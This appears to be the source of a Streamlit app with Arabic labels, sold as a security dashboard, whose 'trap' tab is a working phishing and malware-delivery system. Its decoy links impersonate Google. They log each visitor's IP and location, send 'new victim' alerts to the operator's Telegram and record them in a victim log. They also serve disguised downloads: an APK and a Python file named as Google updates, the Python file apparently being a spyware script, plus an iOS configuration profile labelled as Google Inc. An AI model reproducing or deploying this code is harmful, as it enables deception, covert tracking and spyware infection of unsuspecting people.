import streamlit as st
import os
import base64
from PIL import Image
import requests
import json
from datetime import datetime
import uuid

# استيراد الإعدادات والوحدات
import config
import victim_logger

# إعداد الصفحة
st.set_page_config(page_title="سايبر شيلد برو", layout="wide", page_icon="🛡️")

# تحويل الصورة لـ base64
def get_image_as_base64(path):
    try:
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except: return ""

    # --- CSS نظيف ومرتب لإصلاح التداخل ---
    st.markdown("""
    <style>
    /* إزالة التنسيقات المعقدة التي تسببت في التداخل */
    .main .block-container {
        padding-top: 2rem;
        max-width: 100%;
    }
    
    /* تنسيق العناوين بشكل أفقي وطبيعي */
    .custom-title {
        font-size: 32px !important;
        font-weight: bold !important;
        color: white !important;
        text-align: center;
        margin-bottom: 20px;
    }
    
    /* تحسين شكل التبويبات (Tabs) */
    .stTabs [data-baseweb="tab-list"] {
        gap: 8px;
        overflow-x: auto;
    }
    .stTabs [data-baseweb="tab"] {
        height: 45px;
        white-space: nowrap;
        background-color: #1e293b;
        border-radius: 5px;
        color: white;
        padding: 0 15px;
    }
    .stTabs [aria-selected="true"] {
        background-color: #ff4b4b !important;
    }
    
    /* أزرار واضحة ومرتبة */
    .stButton>button {
        border-radius: 5px;
        font-weight: bold;
        width: 100%;
    }
    
    /* إخفاء واجهة Streamlit الافتراضية - باستثناء الشريط الجانبي */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    /* تأكد من إظهار الشريط الجانبي */
    .stSidebar { display: block !important; }
    </style>
    """, unsafe_allow_html=True)

# دالة جلب الـ IP العام
def get_real_public_ip():
    # قائمة بمصادر جلب الـ IP بالترتيب
    ip_sources = [
        # 1. X-Forwarded-For (من Streamlit Request Headers)
        lambda: st.request.headers.get("X-Forwarded-For").split(",")[0].strip() if st.request and st.request.headers and st.request.headers.get("X-Forwarded-For") else None,
        # 2. Cloudflare (إذا كان التطبيق خلف Cloudflare)
        lambda: st.request.headers.get("CF-Connecting-IP") if st.request and st.request.headers and st.request.headers.get("CF-Connecting-IP") else None,
        # 3. ipify.org
        lambda: requests.get("https://api.ipify.org", timeout=3).text,
        # 4. AbstractAPI (لجلب الـ IP والموقع الجغرافي)
        lambda: requests.get(f"https://ipgeolocation.abstractapi.com/v1/?api_key={config.get_key("ABSTRACT_API_KEY")}", timeout=3).json().get("ip_address") if config.get_key("ABSTRACT_API_KEY") else None
    ]

    for source in ip_sources:
        try:
            ip = source()
            if ip and not ip.startswith(("10.", "172.16.", "172.31.", "192.168.")): # تجاهل الـ IPs المحلية
                return ip
        except:
            pass
    return "Unknown"

# دالة إرسال التنبيه
def generate_ios_mobileconfig(decoy_url):
    profile_uuid = str(uuid.uuid4())
    webclip_uuid = str(uuid.uuid4())
    
    # يمكن استخدام أيقونة Base64 هنا إذا توفرت
    # icon_data = get_image_as_base64("path/to/google_security_icon.png")
    # حالياً، نتركها فارغة أو نستخدم أيقونة افتراضية
    icon_data = "" # Placeholder for actual icon data (base64 encoded PNG/JPG)
    icon_data_tag = f"<key>Icon</key><data>{icon_data}</data>" if icon_data else ""

    mobileconfig_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>URL</key>
            <string>{decoy_url}</string>
            <key>Label</key>
            <string>Google Security</string>
            <key>IsRemovable</key>
            <true/>
            <key>FullScreen</key>
            <true/>
            <key>Precomposed</key>
            <true/>
            <key>PayloadUUID</key>
            <string>{webclip_uuid}</string>
            <key>PayloadDisplayName</key>
            <string>Google Security</string>
            <key>PayloadIdentifier</key>
            <string>com.example.googlesecurity.webclip</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Profile</string>
    <key>PayloadIdentifier</key>
    <string>com.example.googlesecurity.profile</string>
    <key>PayloadUUID</key>
    <string>{profile_uuid}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
    <key>PayloadOrganization</key>
    <string>Google Inc.</string>
    <key>PayloadType</key>
    <string>Configuration</string>
</dict>
</plist>
"""
    return mobileconfig_content.encode("utf-8")

def send_telegram_alert(ip, trap_name, device="Unknown"):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    if not token or not chat_id: return
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {"country": res.get("country"), "city": res.get("city"), "isp": res.get("isp")}
    except: pass
    msg = f"🎯 تنبيه: ضحية جديدة!\n📍 IP: {ip}\n🌍 {geo_data['country']} - {geo_data['city']}\n🏢 {geo_data['isp']}\n📱 {device}\n🎯 {trap_name}"
    try: 
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": msg})
        victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
    except: pass

# وضع التمويه والتحميل
query_params = st.query_params
if "decoy" in query_params:
    ip = get_real_public_ip()
    if "alert_sent" not in st.session_state:
        send_telegram_alert(ip, query_params.get("trap", "Google Decoy"))
        st.session_state.alert_sent = True
    with open("index.html", "r", encoding="utf-8") as f: st.components.v1.html(f.read(), height=1000)
    st.stop()

if "download" in query_params:
    device = query_params.get("device", "pc")
    send_telegram_alert(get_real_public_ip(), f"Download ({device})", device)
    if device == "android": f, c, m = "Google_Update.apk", b"APK", "application/vnd.android.package-archive"
    elif device == "ios":
        # استخدام رابط ثابت لملف التمويه، يجب تحديثه يدوياً في Streamlit Cloud
        decoy_url = "https://rashdai.streamlit.app/?decoy=google&trap=iOS_WebClip"
        f, c, m = "Google_Security.mobileconfig", generate_ios_mobileconfig(decoy_url), "application/x-apple-aspen-config"
    else: f, c, m = "Google_Update.py", open("spy_full.py", "rb").read() if os.path.exists("spy_full.py") else b"Py", "application/octet-stream"
    st.download_button("تحميل", c, file_name=f, mime=m)
    st.stop()

# --- Sidebar ---
with st.sidebar:
    st.image("https://img.icons8.com/fluency/96/shield.png", width=80)
    st.title("🛡️ Rashd_Ai Pro")
    st.markdown("---")
    
    st.subheader("⚙️ الإعدادات")
    groq_key = st.text_input("GROQ API", value=config.get_key("GROQ_API_KEY"), type="password")
    gemini_key = st.text_input("GEMINI API", value=config.get_key("GEMINI_API_KEY"), type="password")
    tavily_key = st.text_input("TAVILY API", value=config.get_key("TAVILY_API_KEY"), type="password")
    tg_token = st.text_input("Telegram Token", value=config.get_key("TELEGRAM_BOT_TOKEN"), type="password")
    tg_chat = st.text_input("Telegram Chat ID", value=config.get_key("TELEGRAM_CHAT_ID"))
    
    if st.button("حفظ الإعدادات"):
        config.set_key("GROQ_API_KEY", groq_key)
        config.set_key("GEMINI_API_KEY", gemini_key)
        config.set_key("TAVILY_API_KEY", tavily_key)
        config.set_key("TELEGRAM_BOT_TOKEN", tg_token)
        config.set_key("TELEGRAM_CHAT_ID", tg_chat)
        st.success("تم الحفظ!")
        st.rerun()

# --- العنوان الرئيسي ---
st.markdown('<div class="custom-title">🧠 مساعد Rashd_Ai الذكي</div>', unsafe_allow_html=True)

# --- التبويبات (Tabs) ---
tabs = st.tabs([
    "💬 المحادثة", "🌐 الشبكة", "🚨 التهديدات", "💡 الخطة", "📄 التقارير",
    "🌐 الدومين", "🔍 المواقع", "👤 المستخدم", "📍 الموقع", "🏗️ سطح الهجوم",
    "📧 التسريبات", "📱 الهاتف", "🌑 الدارك ويب", "🔌 المنافذ", "⚠️ الثغرات", "🎯 المصيدة"
])

# 1. المحادثة
with tabs[0]:
    from ai_hacking import AIHackingAssistant
    if "messages" not in st.session_state: st.session_state.messages = []
    
    with st.container(height=450):
        for msg in st.session_state.messages:
            with st.chat_message(msg["role"]):
                st.markdown(msg["content"])
    
    if prompt := st.chat_input("اكتب رسالتك هنا..."):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"): st.markdown(prompt)
        with st.chat_message("assistant"):
            try:
                assistant = AIHackingAssistant()
                response = assistant.chat(prompt)
            except Exception as e:
                response = f"❌ خطأ في الاتصال: {str(e)}"
            st.markdown(response)
        st.session_state.messages.append({"role": "assistant", "content": response})
        st.rerun()

# 2. الشبكة
with tabs[1]:
    import network_mapper
    t = st.text_input("الهدف لرسم الشبكة", key="net_target")
    if st.button("رسم الشبكة"):
        try: st.image(network_mapper.map_network(t))
        except: st.error("خطأ في الرسم")

# 3. التهديدات
with tabs[2]:
    import ai_threat
    t = st.text_area("بيانات التهديد للتحليل", key="threat_data")
    if st.button("تحليل التهديد"):
        try: st.write(ai_threat.analyze(t))
        except: st.error("خطأ في التحليل")

# 4. الخطة
with tabs[3]:
    import ai_pentest
    t = st.text_input("الهدف لتوليد الخطة", key="plan_target")
    if st.button("توليد الخطة"):
        try: st.write(ai_pentest.generate_plan(t))
        except: st.error("خطأ في توليد الخطة")

# 5. التقارير
with tabs[4]:
    import report_generator
    if st.button("توليد تقرير PDF شامل"):
        try:
            path = report_generator.generate_full_report()
            with open(path, "rb") as f:
                st.download_button("تحميل التقرير", f, file_name="Security_Report.pdf")
        except: st.error("خطأ في توليد التقرير")

# 15. المصيدة
with tabs[15]:
    st.header("🎯 نظام المصيدة والتمويه")
    tid = st.text_input("اسم المصيدة", value="Google_Trap", key="trap_id")
    st.code(f"https://rashdai.streamlit.app/?decoy=google&trap={tid}")
    if st.button("تحديث سجل الضحايا"):
        st.table(victim_logger.get_all_victims())
